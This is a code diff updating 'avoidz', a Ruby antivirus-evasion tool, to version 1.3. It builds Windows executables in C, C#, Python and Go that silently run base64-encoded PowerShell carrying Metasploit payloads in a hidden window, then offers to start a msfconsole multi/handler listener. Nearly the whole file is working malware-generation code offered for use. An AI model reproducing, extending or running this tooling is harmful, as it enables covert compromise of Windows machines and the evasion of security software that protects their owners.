@@ -1,8 +1,8 @@
 #!/usr/bin/ruby
 #
-# avoidz A.V bypass tool . version 1.0
+# avoidz A.V bypass tool . version 1.3
 #
-# Generate encoded powershell with metasploit payloads,convert C & C# Templates to EXE's with MinGW & Monodevelop
+# Generate encoded powershell with metasploit payloads,convert C, C#, py & go to EXE's format
 #
 #                  Created By Mascerano Bachir .
 #                 Website: http://www.dev-labs.co
@@ -18,7 +18,7 @@ require 'optparse'
 require 'base64'
 puts ""
 puts ""
-puts " Tool To bypass most A.V - dev-labs".light_blue
+puts " By Mascerano Bachir | version 1.3 [Dev-labs]".light_blue
 puts ""
 a = Artii::Base.new :font => 'basic'
 puts a.asciify('avoidz').light_blue
@@ -48,7 +48,7 @@ optparse = OptionParser.new do|opts|
                 options[:payload] = m
         end
 
-    opts.on('-f', '--format value', "output format: temp1, temp2, temp3") do |f|
+    opts.on('-f', '--format value', "output format: c1, c2, cs, py, go") do |f|
                 options[:output] = f
         end
     opts.separator ""
@@ -134,8 +134,8 @@ end
 b = Artii::Base.new :font => 'slant'
 puts b.asciify('generate').light_red
 
-#/////////////////////CREATE_TEMP1_EXE_FORMAT\\\\\\\\\\\\\\\\\\\\#
-if $loutput == "temp1"
+#/////////////////////CREATE_C1_EXE_FORMAT\\\\\\\\\\\\\\\\\\\\#
+if $loutput == "c1"
 
 #determine if MinGW has been installed, support new and old MinGW system paths
 mingw = true if File::exists?('/usr/i586-mingw32msvc') || File::exists?('/usr/bin/i586-migw32msvc')
@@ -147,11 +147,11 @@ end
 
     powershell_encoded = gen_PS_shellcode()
 
-exeTEMPLATE = %{#include <stdio.h>
+c1TEMPLATE = %{#include <stdio.h>
 #include <windows.h>
 int shellCode(){
 	system("color 63");
-	system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}"); 
+	system("powershell.exe -nop -win Hidden -noni -enc #{powershell_encoded}"); 
 	/*
 		((Shell Code into the console))
 	*/
@@ -172,33 +172,33 @@ int main(){
 
 #write out to a new file
 c_file_temp = File.new("c_file_temp.c", "w")
-c_file_temp.write(exeTEMPLATE)
+c_file_temp.write(c1TEMPLATE)
 c_file_temp.close
    
 #compiling will require MinGW installed - "apt-get install mingw32"
 puts "\n[*] compiling to exe......".yellow
 
-system("i586-mingw32msvc-gcc c_file_temp.c -o /root/temp1.exe -lws2_32 -mwindows")
+system("i586-mingw32msvc-gcc c_file_temp.c -o /root/c1.exe -lws2_32 -mwindows")
 system("rm c_file_temp.c")
 
-puts "-------------------------------------------------".light_blue
-puts "[*] payload exec generated in /root/temp1.exe [*]".light_blue
-puts "-------------------------------------------------".light_blue
+puts "----------------------------------------------".light_blue
+puts "[*] payload exec generated in /root/c1.exe [*]".light_blue
+puts "----------------------------------------------".light_blue
 
 puts "\n[*] Would you like to start a listener? (Y/n)".yellow
 msf_bool = $stdin.gets.chomp
 msf_bool = msf_bool.upcase
 if msf_bool == 'Y'
         system("service postgresql start")
-        system("xterm -fa monaco -fs 10 -bg black -e msfconsole -x 'use multi/handler;\n set lhost #{$lhost};\n set lport #{$lport};\n set payload #{$lpayload};\n exploit -j -z'")
+        system("xterm -fa monaco -fs 10 -bg black -e msfconsole -x 'use multi/handler;\n set lhost #{$lhost};\n set lport #{$lport};\n set payload #{$lpayload};\n set exitonsession false;\n set enablestageencoding true;\n exploit -j -z'")
 else
 		puts ""
 		puts options
 		puts "\n\n Good Bye!".yellow
 	end
 end
-#/////////////////////CREATE_TEMP2_EXE_FORMAT\\\\\\\\\\\\\\\\\\\\#
-if $loutput == "temp2"
+#/////////////////////CREATE_C2_EXE_FORMAT\\\\\\\\\\\\\\\\\\\\#
+if $loutput == "c2"
 
 #determine if MinGW has been installed, support new and old MinGW system paths
 mingw = true if File::exists?('/usr/i586-mingw32msvc') || File::exists?('/usr/bin/i586-migw32msvc')
@@ -210,7 +210,7 @@ end
 
     powershell_encoded = gen_PS_shellcode()
 
-exe2TEMPLATE = %{#include <stdio.h>
+c2TEMPLATE = %{#include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 #include <ctype.h>
@@ -230,33 +230,33 @@ exit(0);
 
 #write out to a new file
 c_file_temp = File.new("c_file_temp.c", "w")
-c_file_temp.write(exe2TEMPLATE)
+c_file_temp.write(c2TEMPLATE)
 c_file_temp.close
 
 #compiling will require MinGW installed - "apt-get install mingw32"
 puts "\n[*] compiling to exe......".yellow
 
-system("i586-mingw32msvc-gcc c_file_temp.c -o /root/temp2.exe -lws2_32 -mwindows > /dev/null 2>&1")
+system("i586-mingw32msvc-gcc c_file_temp.c -o /root/c2.exe -lws2_32 -mwindows > /dev/null 2>&1")
 system("rm c_file_temp.c")
 
-puts "-------------------------------------------------".light_blue
-puts "[*] payload exec generated in /root/temp2.exe [*]".light_blue
-puts "-------------------------------------------------".light_blue
+puts "----------------------------------------------".light_blue
+puts "[*] payload exec generated in /root/c2.exe [*]".light_blue
+puts "----------------------------------------------".light_blue
 
 puts "\n[*] Would you like to start a listener? (Y/n)".yellow
 msf_bool = $stdin.gets.chomp
 msf_bool = msf_bool.upcase
 if msf_bool == 'Y'
         system("service postgresql start")
-        system("xterm -fa monaco -fs 10 -bg black -e msfconsole -x 'use multi/handler;\n set lhost #{$lhost};\n set lport #{$lport};\n set payload #{$lpayload};\n exploit -j -z'")
+        system("xterm -fa monaco -fs 10 -bg black -e msfconsole -x 'use multi/handler;\n set lhost #{$lhost};\n set lport #{$lport};\n set payload #{$lpayload};\n set exitonsession false;\n set enablestageencoding true;\n exploit -j -z'")
 else
 		puts ""
 		puts options
 		puts "\n\n Good Bye!".yellow
 	end
 end
-#/////////////////////CREATE_TEMP3_EXE_FORMAT\\\\\\\\\\\\\\\\\\\\#
-if $loutput == "temp3"
+#/////////////////////CREATE_CS_EXE_FORMAT\\\\\\\\\\\\\\\\\\\\#
+if $loutput == "cs"
 
 #determine if Monodevelop has been installed .
 mingw = true if File::exists?('/usr/lib/monodevelop') || File::exists?('/usr/bin/monodevelop')
@@ -268,7 +268,7 @@ end
 
     powershell_encoded = gen_PS_shellcode()
 
-exe3TEMPLATE = %{// C#
+csTEMPLATE = %{// C#
 using System.Runtime.InteropServices;
 namespace pshcmd
 {
@@ -278,7 +278,7 @@ namespace pshcmd
 		public static extern int system(string cmd);
 		public static void Main()
 		{
-			system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}");
+			system("powershell.exe -nop -win Hidden -noni -enc #{powershell_encoded}");
 		}
 	}
 }
@@ -287,29 +287,138 @@ namespace pshcmd
 
 #write out to a new file
 c_file_temp = File.new("c_file_temp.c", "w")
-c_file_temp.write(exe3TEMPLATE)
+c_file_temp.write(csTEMPLATE)
 c_file_temp.close
 
 #compiling will require Monodevelop installed - "apt-get install monodevelop"
 puts "\n[*] compiling to exe......".yellow
 
-system("mcs c_file_temp.c -out:/root/temp3.exe")
+system("mcs c_file_temp.c -out:/root/cs.exe")
 system("rm c_file_temp.c")
 
-puts "-------------------------------------------------".light_blue
-puts "[*] payload exec generated in /root/temp3.exe [*]".light_blue
-puts "-------------------------------------------------".light_blue
+puts "----------------------------------------------".light_blue
+puts "[*] payload exec generated in /root/cs.exe [*]".light_blue
+puts "----------------------------------------------".light_blue
 
 puts "\n[*] Would you like to start a listener? (Y/n)".yellow
 msf_bool = $stdin.gets.chomp
 msf_bool = msf_bool.upcase
 if msf_bool == 'Y'
         system("service postgresql start")
-        system("xterm -fa monaco -fs 10 -bg black -e msfconsole -x 'use multi/handler;\n set lhost #{$lhost};\n set lport #{$lport};\n set payload #{$lpayload};\n exploit -j -z'")
+        system("xterm -fa monaco -fs 10 -bg black -e msfconsole -x 'use multi/handler;\n set lhost #{$lhost};\n set lport #{$lport};\n set payload #{$lpayload};\n set exitonsession false;\n set enablestageencoding true;\n exploit -j -z'")
 else
 		puts ""
 		puts options
 		puts "\n\n Good Bye!".yellow
 	end
 end
+#/////////////////////CREATE_PY_EXE_FORMAT\\\\\\\\\\\\\\\\\\\\#
+if $loutput == "py"
 
+#determine if Wine has been installed .
+mingw = true if File::exists?('/usr/lib/wine') || File::exists?('/usr/bin/wine')
+if mingw == false
+    puts "[*] You must have Wine installed in order to compile python to EXEs!!".red	
+    puts "\n\t[*] Run script setup.sh : ./setup.sh \n".red
+    exit 1
+end
+
+    powershell_encoded = gen_PS_shellcode()
+
+pyTEMPLATE = %{import os
+os.system("powershell.exe -nop -win Hidden -noni -enc #{powershell_encoded}")
+}
+
+
+#write out to a new file
+c_file_temp = File.new("c_file_temp.py", "w")
+c_file_temp.write(pyTEMPLATE)
+c_file_temp.close
+
+#compiling will require Wine installed - "sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine:i386"
+puts "\n[*] compiling to exe......".yellow
+
+system("wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe -F c_file_temp.py > /dev/null 2>&1")
+system("cp dist/c_file_temp.exe /root/py.exe")
+system("rm c_file_temp.py")
+system("rm c_file_temp.spec")
+system("rm -r build")
+system("rm -r dist")
+
+puts "----------------------------------------------".light_blue
+puts "[*] payload exec generated in /root/py.exe [*]".light_blue
+puts "----------------------------------------------".light_blue
+
+puts "\n[*] Would you like to start a listener? (Y/n)".yellow
+msf_bool = $stdin.gets.chomp
+msf_bool = msf_bool.upcase
+if msf_bool == 'Y'
+        system("service postgresql start")
+        system("xterm -fa monaco -fs 10 -bg black -e msfconsole -x 'use multi/handler;\n set lhost #{$lhost};\n set lport #{$lport};\n set payload #{$lpayload};\n set exitonsession false;\n set enablestageencoding true;\n exploit -j -z'")
+else
+		puts ""
+		puts options
+		puts "\n\n Good Bye!".yellow
+	end
+end
+#/////////////////////CREATE_GO_EXE_FORMAT\\\\\\\\\\\\\\\\\\\\#
+if $loutput == "go"
+
+#determine if golang has been installed .
+mingw = true if File::exists?('/usr/lib/go') || File::exists?('/usr/bin/go')
+if mingw == false
+    puts "[*] You must have Golang installed in order to compile to EXEs!!".red	
+    puts "\n\t[*] Run script setup.sh : ./setup.sh \n".red
+    exit 1
+end
+
+    powershell_encoded = gen_PS_shellcode()
+
+goTEMPLATE = %{package main
+
+import "os/exec"
+
+func main() {
+
+    cmd := exec.Command("powershell.exe", "-nop", "-win", "Hidden", "-noni", "-enc", "#{powershell_encoded}")
+    stdout, err := cmd.Output()
+
+    if err != nil {
+        println(err.Error())
+        return
+    }
+
+    print(string(stdout))
+}
+}
+
+
+
+#write out to a new file
+c_file_temp = File.new("c_file_temp.go", "w")
+c_file_temp.write(goTEMPLATE)
+c_file_temp.close
+
+#compiling will require Golang installed - "apt-get install golang"
+puts "\n[*] compiling to exe......".yellow
+
+system("export GOOS=windows && export GOARCH=386 && go build -ldflags -H=windowsgui c_file_temp.go")
+system("mv c_file_temp.exe /root/go.exe")
+system("rm c_file_temp.go")
+
+puts "----------------------------------------------".light_blue
+puts "[*] payload exec generated in /root/go.exe [*]".light_blue
+puts "----------------------------------------------".light_blue
+
+puts "\n[*] Would you like to start a listener? (Y/n)".yellow
+msf_bool = $stdin.gets.chomp
+msf_bool = msf_bool.upcase
+if msf_bool == 'Y'
+        system("service postgresql start")
+        system("xterm -fa monaco -fs 10 -bg black -e msfconsole -x 'use multi/handler;\n set lhost #{$lhost};\n set lport #{$lport};\n set payload #{$lpayload};\n set exitonsession false;\n set enablestageencoding true;\n exploit -j -z'")
+else
+		puts ""
+		puts options
+		puts "\n\n Good Bye!".yellow
+	end
+end
